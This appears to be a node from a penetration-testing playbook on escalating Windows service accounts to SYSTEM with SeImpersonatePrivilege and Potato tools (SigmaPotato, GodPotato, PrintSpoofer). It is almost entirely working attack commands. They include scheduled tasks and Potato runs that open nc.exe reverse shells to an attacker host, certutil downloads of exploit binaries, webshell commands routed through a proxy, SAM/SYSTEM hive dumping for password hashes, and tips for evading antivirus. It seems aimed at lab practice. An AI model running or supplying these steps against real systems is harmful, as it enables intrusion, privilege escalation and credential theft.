title: SeImpersonatePrivilege → SYSTEM (Potato Attacks)
body:
SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) on Windows means you can impersonate tokens — which lets you escalate from a service account (IIS, MSSQL, Apache/WAMP) to SYSTEM via token impersonation. This privilege shows up constantly on web app shells because IIS and other service accounts have it by default.

Potato attacks exploit COM/DCOM/RPC or named pipes to get a SYSTEM token and create a process under it. Pick the right potato for the OS:
- SigmaPotato — modern, works on 2019/2022/Win10/11, no BITS/PrintSpooler needed
- PrintSpoofer — Server 2016/2019, Win10
- GodPotato — broadest compatibility
- JuicyPotato — older (pre-2019), needs CLSID
- SweetPotato — similar to JuicyPotato, updated
cmd:
# ══════════════════════════════════════════════════
# RESTRICTED TOKEN FIX — SeImpersonate MISSING
# (LOCAL SERVICE / NETWORK SERVICE with pruned privileges)
# ══════════════════════════════════════════════════
# Symptom: whoami /priv shows SeImpersonatePrivilege is ABSENT (not disabled)
# Cause: Windows can run service accounts with a reduced privilege set
# Fix: scheduled task spawns a new process with the FULL default token
#
# Step 1 — get a basic shell via scheduled task (restores most privileges):
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe LHOST 4444 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
# Check whoami /priv in new shell — SeImpersonate may now appear
# If still missing, go to Step 2:

# Step 2 — explicitly request SeImpersonatePrivilege via principal:
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege","SeAuditPrivilege","SeChangeNotifyPrivilege","SeCreateGlobalPrivilege","SeImpersonatePrivilege","SeIncreaseWorkingSetPrivilege"

$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe LHOST 4444 -e cmd.exe`""

Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
Start-ScheduledTask -TaskName "GrantAllPerms"
# New shell has SeImpersonatePrivilege Enabled → now run potato

# Cleanup after:
Unregister-ScheduledTask -TaskName "GrantPerm" -Confirm:$false
Unregister-ScheduledTask -TaskName "GrantAllPerms" -Confirm:$false

# ══════════════════════════════════════════════════
# CONFIRM THE PRIVILEGE
# ══════════════════════════════════════════════════
whoami /priv
# Look for either of these:
# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
# SeAssignPrimaryTokenPrivilege    Replace a process level token    Enabled/Disabled
# Disabled still works — the exploit enables it

whoami
# Common service accounts with SeImpersonate:
# IIS APPPOOL\DefaultAppPool
# NT AUTHORITY\NETWORK SERVICE
# NT AUTHORITY\LOCAL SERVICE
# confluence / tomcat / wamp service users

# ══════════════════════════════════════════════════
# PICK YOUR POTATO
# ══════════════════════════════════════════════════
# Check OS version first:
systeminfo | findstr /i "os name\|os version\|build"
# or:
wmic os get caption,version

# OS → Recommended potato:
# Win10 / Server 2016-2022  → SigmaPotato or GodPotato (both work)
# Server 2016/2019 / Win10  → PrintSpoofer
# Server 2008-2016 / Win7   → JuicyPotato (needs CLSID)
# Any modern Windows        → GodPotato (most universal)

# ══════════════════════════════════════════════════
# SIGMAPOTATO (used on Squid box)
# ══════════════════════════════════════════════════
# Download: github.com/tylerdotrar/SigmaPotato
# Transfer to target:
# certutil -urlcache -f http://LHOST:8001/SigmaPotato.exe SigmaPotato.exe

# Run a command as SYSTEM:
SigmaPotato.exe "whoami"

# Run your Sliver/C2 beacon as SYSTEM:
SigmaPotato.exe beacon.exe
# [+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
# [+] Found System Token: True
# [+] Creating Process via CreateProcessAsUserW

# Run nc.exe reverse shell as SYSTEM:
SigmaPotato.exe "C:\tmp\nc.exe -e cmd.exe LHOST 7777"
# nc -nlvp 7777 on Kali

# ══════════════════════════════════════════════════
# GODPOTATO (most universal, good fallback)
# ══════════════════════════════════════════════════
# Download: github.com/BeichenDream/GodPotato
certutil -urlcache -f http://LHOST:8001/GodPotato.exe GodPotato.exe

GodPotato.exe -cmd "whoami"
GodPotato.exe -cmd "C:\tmp\nc.exe -e cmd.exe LHOST 7777"

# ══════════════════════════════════════════════════
# PRINTSPOOFER (Server 2016/2019, Win10)
# ══════════════════════════════════════════════════
certutil -urlcache -f http://LHOST:8001/PrintSpoofer64.exe PrintSpoofer64.exe

PrintSpoofer64.exe -i -c cmd
# Opens interactive SYSTEM cmd shell

PrintSpoofer64.exe -c "C:\tmp\nc.exe -e cmd.exe LHOST 7777"

# ══════════════════════════════════════════════════
# VIA SLIVER (SharpEfsPotato — see sharp_efs_potato_sliver node)
# ══════════════════════════════════════════════════
# If you have a Sliver session (not beacon):
# execute-assembly -- SharpEfsPotato.exe '-p C:\tmp\beacon.exe'
# → see sharp_efs_potato_sliver node for full Sliver-specific workflow

# ══════════════════════════════════════════════════
# AFTER GETTING SYSTEM
# ══════════════════════════════════════════════════
whoami
# NT AUTHORITY\SYSTEM
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\local.txt

# Dump hashes if needed:
# In SYSTEM shell:
reg save HKLM\SAM C:\tmp\sam.bak
reg save HKLM\SYSTEM C:\tmp\sys.bak
# Transfer to Kali and:
# impacket-secretsdump -sam sam.bak -system sys.bak LOCAL

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# SigmaPotato: 'CreateProcessAsUserW failed':
#   → Try running from C:\Windows\Temp or C:\tmp instead of web root
#   → Web root may have execution restrictions

# Connection refused when transferring potato binary:
#   → Retry certutil — transient network errors are common (try 2-3x)
#   → Check python server is still running on Kali

# Process created but no shell connects:
#   → Check Kali listener is on the right port
#   → AV may be blocking nc.exe — try a different binary name
#   → Use Sliver beacon instead of nc.exe (more AV-evasive)

# Potato says 'SeImpersonatePrivilege not held':
#   → Your shell doesn't actually have it
#   → Check whoami /priv again from the exact shell you're running from
#   → Some web shells lose privileges — get a proper interactive shell first# ══════════════════════════════════════════════════
# PRO TIP — USE CURL THROUGH PROXY INSTEAD OF BROWSER
# (avoids URL encoding headaches entirely)
# ══════════════════════════════════════════════════
# When you have a webshell behind a Squid proxy, curl handles
# the command cleanly — no need to URL-encode spaces or special chars:
# curl "http://127.0.0.1:8080/shell.php?cmd=certutil+-urlcache+-f+http://LHOST/nc.exe+nc.exe" --proxy $ip:3128
# curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+LHOST+6666+-e+cmd.exe" --proxy $ip:3128
# Much cleaner than fighting browser URL encoding.
warn: Run the potato from a writable directory that allows execution — C:\tmp or C:\Windows\Temp are safer than the web root directory which may have execution restrictions. certutil transfers occasionally fail with network errors — just retry. SigmaPotato and GodPotato both work on modern Windows without needing specific CLSIDs, making them the first choice over JuicyPotato.

choices.label: Using Sliver — run via SharpEfsPotato execute-assembly
Potato failed — try other Windows privesc
Got SYSTEM — add user to local Admins for clean re-entry
